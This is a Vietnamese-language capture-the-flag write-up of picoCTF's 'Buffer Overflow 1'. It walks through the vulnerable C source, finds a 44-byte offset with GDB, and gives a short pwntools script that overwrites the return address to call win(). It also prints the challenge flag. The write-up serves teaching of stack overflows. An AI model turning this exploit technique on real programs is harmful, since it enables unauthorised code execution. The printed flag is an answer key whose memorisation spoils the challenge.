# Buffer Overflow 1
Giống như ở bài `Buffer Overflow 0`, challenge này cho chúng ta 2 file. Một file binary `vuln` và một file .c `vuln.c`.

Mở file `vuln.c` thì ta có source code của challenge này như sau:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

Đặc điểm chung là ta đều phải tạo file `flag.txt` trước khi chạy local =))))

Ta thấy câu lệnh gây nên lỗi `buffer overflow`:

``` c
gets(buf);
```

Và hàm `win()` sẽ in ra flag:

``` c
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```

Vậy giờ ta sẽ làm sao đó để ghi đè địa chỉ trả về của hàm `vuln()` thành địa chỉ hàm `win()` để khi hàm `vuln()` được gọi xong thì hàm `win()` sẽ được gọi để in flag.

Đầu tiên dùng lệnh `checksec` để kiểm tra các cơ chế bảo mật được bật trong file binary, ta thấy đây là một chương trình ELF 32 bit và `PIE` không được bật:

![image](https://github.com/user-attachments/assets/61330016-e78f-45ec-94ba-7b9a76507db6)

Vì vậy nên địa chỉ của hàm `win()` là cố định nên có thể dễ dàng ghi đè địa chỉ của hàm `win()` lên địa chỉ trả về của hàm `vuln()`.

Ta có địa chỉ hàm `win()` là `0x080491f6`. Ta biết rằng mảng `buf` có kích thước là `BUFSIZE` (32 bytes) nên ta cần `offset` lớn hơn 32. Ta biết được rằng lệnh `return` sẽ lấy địa chỉ trả về từ đỉnh `stack` ngay tại thời điểm đó hay cụ thể trong bài này sẽ là giá trị tại địa chỉ được con trỏ `$esp` trỏ tới.

Chỉ cần dùng `GDB` ta thấy rằng khi bắt đầu nhập chuỗi kí tự thì địa chỉ nhận dữ liệu ban đầu là `0xffffd010` và địa chỉ vùng nhớ mà lệnh `return` trỏ tới trên stack là `0xffffd03c`:

![image](https://github.com/user-attachments/assets/d1c7dd25-a5c9-46a9-b067-c2b86933d197)

Lấy `0xffffd03c` trừ đi `0xffffd010`:

``` python
>>> 0xffffd03c-0xffffd010
44
```

Vậy `offset` ta đang tìm là `44`. 
Dựa vào những phân tích trên, ta có file exploit như sau:

``` python 
from pwn import *

payload = 44 * b'a'
payload += b'\xf6\x91\x04\x08'
#p = process("./vuln")
p = remote("saturn.picoctf.net", 60768)
p.sendline(payload)
p.interactive()
```

Và ta có flag:

```
picoCTF{addr3ss3s_ar3_3asy_b15b081e}
```
